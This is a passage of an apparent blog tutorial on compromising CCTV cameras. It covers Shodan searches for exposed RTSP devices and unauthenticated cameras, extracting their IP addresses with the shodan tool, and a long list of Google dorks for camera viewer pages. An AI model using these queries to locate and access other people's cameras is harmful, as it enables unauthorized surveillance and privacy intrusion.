&lt;li&gt;Shodan&lt;/li&gt;
&lt;li&gt;Google Dorking&lt;/li&gt;
&lt;li&gt;Port Scanning&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;shodan&#34;&gt;Shodan
&lt;/h4&gt;&lt;p&gt;On &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan Search Engine&lt;/a&gt;, search with query &lt;em&gt;port:554 RTSP&lt;/em&gt;. This would list out all the Devices that have Port 554 Open found by Shodan with &lt;em&gt;RTSP&lt;/em&gt; in their banner. Most of them will be CCTVs.
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_hu14443492354665730748.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_hu16264344125568431578.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan CCTV Search&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
We can even filter out more on various basis, for example location (country, city, etc)&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_report.png&#34;
	width=&#34;1279&#34;
	height=&#34;1021&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_report_hu14764165423814458476.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_report_hu10659267179480159027.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Report&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;125&#34;
		data-flex-basis=&#34;300px&#34;
	
&gt;&lt;br /&gt;
Or if we want to find CCTVs that have no authentication, we can provide the filter &lt;em&gt;has_screenshot:true&lt;/em&gt;.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_open.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_open_hu14618864246904070306.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_open_hu2971455043730689372.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Search Open&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br/&gt;
After setting the requeired filters, we can download the results.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results.png&#34;
	width=&#34;715&#34;
	height=&#34;56&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_hu2063741215654517212.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_hu6580981014759218426.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Download Results&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1276&#34;
		data-flex-basis=&#34;3064px&#34;
	
&gt;&lt;br /&gt;
The Number of Results that can be downloaded depends upon your query credits available(1 Query Credit = 100 Results)&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_1.png&#34;
	width=&#34;1224&#34;
	height=&#34;496&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_1_hu565796369991160296.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_1_hu11318525179348910452.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Download Results&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;246&#34;
		data-flex-basis=&#34;592px&#34;
	
&gt;&lt;br /&gt;
After Shodan has done compiling the data, it sends us a Mail that &lt;em&gt;Data is ready for Download&lt;/em&gt; or we can alernatively wait on &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/download&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan Download Page&lt;/a&gt; while the data is being compiled&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_mail.png&#34;
	width=&#34;827&#34;
	height=&#34;526&#34;
	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_mail_hu18147256887731184041.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_mail_hu13989390231115179836.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Download Mail&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;157&#34;
		data-flex-basis=&#34;377px&#34;
	
&gt;&lt;br /&gt;
The Download will be in the format &lt;em&gt;.json.gz&lt;/em&gt;. Shodan provides a Command-Line Utility to Parse the data in these download files.&lt;br /&gt;
The utility can be installed with the command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install shodan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The IP Addresses from the downloaded file can be extracted with the following command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;To save the IP Addresses to a file, simply redirect the output of the command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz &amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name_to_save_ip_addresses_to&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;I sometimes manually filterout some IPs by running a port scan, because sometimes the information provided by Shodan for some Devices is outdated.&lt;/p&gt;
&lt;h4 id=&#34;google-dorking&#34;&gt;Google Dorking
&lt;/h4&gt;&lt;p&gt;Here is the Google Dorks that I use for finding CCTVs&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;view/index.shtml&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;MultiCameraFrame?Mode=Motion&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;VB&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Viewer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;viewer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;live&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ja&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;live&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;IP CAMERA Viewer&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;setting | Client setting&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Device(&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Network Camera&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;language:&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;webcam 7&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/gallery.html&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Yawcam&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8081&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;control&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;camerainfo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;webcamXP 5&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;download&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/view/view.shtml?id=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;viewer_index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;powered by webcamXP 5&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webcam&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8080&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Live View / - AXIS&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;indexFrame&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;MJPG Live Demo&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;intext:Select preset position&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Axis&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.10&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.12&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.30&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.31&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.32&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.33&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.34&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.40&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.42&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.43&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Network Camera&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Edr1680&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;viewer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EverFocus&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDSR&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDSE400&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Applet&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDR1600&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Welcome&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;BlueNet Video Viewer&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SNC-RZ30&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;demo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cgi&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;guestimage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EyeSpyFX&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OptiCamFX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;go to camera&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;servlet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DetectBrowser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Veo Observer XT&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;asp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aspx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pdf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;observer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;iGuard Fingerprint Security System&amp;#34;&lt;/span&gt;
